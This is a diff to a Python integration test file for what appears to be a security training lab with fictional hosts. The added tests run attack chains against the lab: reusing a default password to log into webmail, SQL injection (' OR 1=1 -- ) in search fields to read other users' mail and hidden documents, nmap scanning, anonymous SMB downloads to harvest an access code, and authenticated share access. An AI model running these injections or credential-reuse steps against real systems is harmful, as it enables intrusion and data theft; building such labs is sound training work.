@@ -53,7 +53,9 @@ class ColabIntegrationTests(unittest.TestCase):
         self.assertIn("text/html", result.stdout)
         account = json.loads((self.lab.root / "account.json").read_text())
         config = configparser.ConfigParser(interpolation=None)
-        config.read(self.lab.root / "smb.conf")
+        from colab_targets import SAMBA_SERVERS
+
+        config.read(SAMBA_SERVERS[0].config_path(self.lab.root))
         share = next(section for section in config.sections() if section != "global")
         destination = f"//{TARGET_HOST}/{share}"
         import subprocess
@@ -65,6 +67,111 @@ class ColabIntegrationTests(unittest.TestCase):
             destination,
             "-U",
             f"{account['username']}%{account['password']}",
+            "-c",
+            "ls",
+        )
+        self.assertTrue(shared.stdout.strip())
+
+    def curl(self, *arguments: str) -> str:
+        return self.lab.run("curl", "--noproxy", "*", "-fsS", *arguments).stdout
+
+    def test_社内Webメールに正規ログインし検索の注入で範囲外のメールも読める(
+        self,
+    ) -> None:
+        import importlib.util
+        import tempfile
+        from urllib.parse import quote
+
+        spec = importlib.util.spec_from_file_location(
+            "webmail_app", self.lab.root / "webmail/app.py"
+        )
+        webmail = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(webmail)
+        # Webメールは、Sambaと共通の初期パスワードでログインする。
+        account = json.loads((self.lab.root / "account.json").read_text())
+        site = "http://mail.mikuriya-suisan.local"
+        with tempfile.TemporaryDirectory() as temp:
+            jar = str(Path(temp) / "cookies")
+            mailbox = self.curl(
+                "-c",
+                jar,
+                "-b",
+                jar,
+                "-L",
+                "--data-urlencode",
+                f"email={webmail.KANZAKI_EMAIL}",
+                "--data-urlencode",
+                f"password={account['password']}",
+                f"{site}/login",
+            )
+            self.assertIn("/message?id=", mailbox)
+            normal = self.curl("-b", jar, f"{site}/search?q=")
+            injected = self.curl(
+                "-b", jar, f"{site}/search?q={quote(chr(39) + ' OR 1=1 -- ')}"
+            )
+        # 検索結果は本文付きで1件ずつ並ぶ。注入すると本人以外のメールも混ざる。
+        marker = 'class="search-result"'
+        self.assertGreater(injected.count(marker), normal.count(marker))
+
+    def test_政府サーバーは3つのサービスを公開し共有の範囲が寿司屋と分かれる(
+        self,
+    ) -> None:
+        import subprocess
+
+        result = self.lab.run(
+            "nmap", "-sV", "-p", "80,445,8080", "-oX", "-", "kaiiki-hozen.local"
+        )
+        root = ET.fromstring(result.stdout)
+        states = {
+            int(port.attrib["portid"]): port.find("state").attrib["state"]
+            for port in root.findall(".//port")
+        }
+        self.assertEqual(states, {80: "open", 445: "open", 8080: "open"})
+        listed = self.lab.run("smbclient", "-L", "//kaiiki-hozen.local", "-N").stdout
+        self.assertIn("handover", listed)
+        self.assertIn("handoff", listed)
+        self.assertNotIn("staff", listed)
+        with self.assertRaises(subprocess.CalledProcessError):
+            self.lab.run("smbclient", "//kaiiki-hozen.local/handoff", "-N", "-c", "ls")
+
+    def test_匿名共有の閲覧コードで目録に入り検索の注入から保護共有へ進める(
+        self,
+    ) -> None:
+        import re
+        import tempfile
+        from urllib.parse import quote
+
+        from colab_targets import PORTAL_ACCOUNT
+
+        with tempfile.TemporaryDirectory() as temp:
+            listing = self.lab.run(
+                "smbclient",
+                "//kaiiki-hozen.local/handover",
+                "-N",
+                "-c",
+                f"lcd {temp}; recurse; prompt; mget *",
+            )
+            self.assertEqual(listing.returncode, 0)
+            texts = "".join(
+                path.read_text(encoding="utf-8") for path in Path(temp).rglob("*.txt")
+            )
+            code = re.search(r"[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}", texts)[0]
+            jar = str(Path(temp) / "cookies")
+            catalog = "http://kaiiki-hozen.local:8080"
+            self.curl(
+                "-c", jar, "-b", jar, "-L", "-d", f"code={code}", f"{catalog}/login"
+            )
+            normal = self.curl("-b", jar, f"{catalog}/?keyword=")
+            injected = self.curl(
+                "-b", jar, f"{catalog}/?keyword={quote(chr(39) + ' OR 1=1 -- ')}"
+            )
+        self.assertGreater(injected.count("/documents/"), normal.count("/documents/"))
+        username, password = PORTAL_ACCOUNT
+        shared = self.lab.run(
+            "smbclient",
+            "//kaiiki-hozen.local/handoff",
+            "-U",
+            f"{username}%{password}",
             "-c",
             "ls",
         )
